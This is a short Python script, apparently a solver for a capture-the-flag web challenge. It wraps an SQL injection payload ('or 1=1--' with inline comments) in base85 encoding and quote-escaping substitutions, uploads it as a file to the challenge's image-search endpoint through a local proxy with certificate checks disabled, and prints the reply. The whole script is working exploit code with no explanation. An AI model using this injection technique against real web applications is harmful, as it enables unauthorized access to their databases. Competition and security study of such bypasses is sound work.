import requests
import base64
import re

r = requests.session()
proxies = {
	'http': '127.0.0.1:8080',
   'https': '127.0.0.1:8080'
}
b85_string = "a\\\\\\\\\\\\\\'/**/or/**/1=1--/**/-" # target
dec = base64.a85decode(b85_string)
b85 = base64.a85encode(dec)
b85_string = b85.decode('UTF-8', 'ignore')

b85_string = re.sub('\\\\\\\\\\\\\'', '~', b85_string)
b85_string = re.sub('\'', '\'\'', b85_string)
b85_string = re.sub('~', '\'', b85_string)
b85_string = re.sub('\\:', '~', b85_string)
print(f"check : {b85_string}")

url = 'https://85-reasons-why.lac.tf/image-search'

file = {"image-query": ("coba.png", dec)}

headers = {
	"Content-Type": "multipart/form-data",
}

resp = r.post(url,proxies=proxies,files=file,verify=False)

print(resp.text)